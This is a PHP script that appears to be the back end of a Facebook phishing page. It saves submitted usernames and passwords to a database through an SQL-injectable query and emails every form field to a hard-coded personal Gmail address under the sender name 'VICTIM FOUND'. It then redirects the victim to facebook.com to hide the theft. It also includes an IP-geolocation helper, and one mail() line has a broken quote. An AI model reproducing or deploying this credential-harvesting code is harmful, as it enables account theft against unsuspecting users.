<?php  
if($_SERVER["REQUEST_METHOD"]=="POST"){

$host="localhost";
$username="ENTER YOUR USERNAME HERE";
$pass="ENTER YOUR SQL PASSWORD HERE";
$db="ENTER YOUR SQL DATABASW HERE";

$conn=new mysqli($host,$username,$pass,$db);
if($conn->connect_error)
die("sorry there is a problem");
$user=$_POST['name'];
$password=$_POST['password'];
$sql="INSERT INTO login (username,password) VALUES ('$user','$password')";
if(!$conn->query($sql))
die($conn->error);

$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: VICTIM FOUND <donotreply@noone.com>'."\r\n";
$header .= 'Reply-To: donotreply@noone.com'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('saileshdabydin@gmail.com, $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);


header("Location: https://www.facebook.com");
die();

exit;


function detect_city($ip) {
        
        $default = 'UNKNOWN';

        if (!is_string($ip) || strlen($ip) < 1 || $ip == '127.0.0.1' || $ip == 'localhost')
            $ip = '8.8.8.8';

        $curlopt_useragent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6 (.NET CLR 3.5.30729)';
        
        $url = 'http://ipinfodb.com/ip_locator.php?ip=' . urlencode($ip);
        $ch = curl_init();
        
        $curl_opt = array(
            CURLOPT_FOLLOWLOCATION  => 1,
            CURLOPT_HEADER      => 0,
            CURLOPT_RETURNTRANSFER  => 1,
            CURLOPT_USERAGENT   => $curlopt_useragent,
            CURLOPT_URL       => $url,
            CURLOPT_TIMEOUT         => 1,
            CURLOPT_REFERER         => 'http://' . $_SERVER['HTTP_HOST'],
        );
        
        curl_setopt_array($ch, $curl_opt);
        
        $content = curl_exec($ch);
        
        if (!is_null($curl_info)) {
            $curl_info = curl_getinfo($ch);
        }
        
        curl_close($ch);
        
        if ( preg_match('{<li>City : ([^<]*)</li>}i', $content, $regs) )  {
            $city = $regs[1];
        }
        if ( preg_match('{<li>State/Province : ([^<]*)</li>}i', $content, $regs) )  {
            $state = $regs[1];
        }

        if( $city!='' && $state!='' ){
          $location = $city . ', ' . $state;
          return $location;
        }else{
          return $default; 
        }
        
}


}
?>
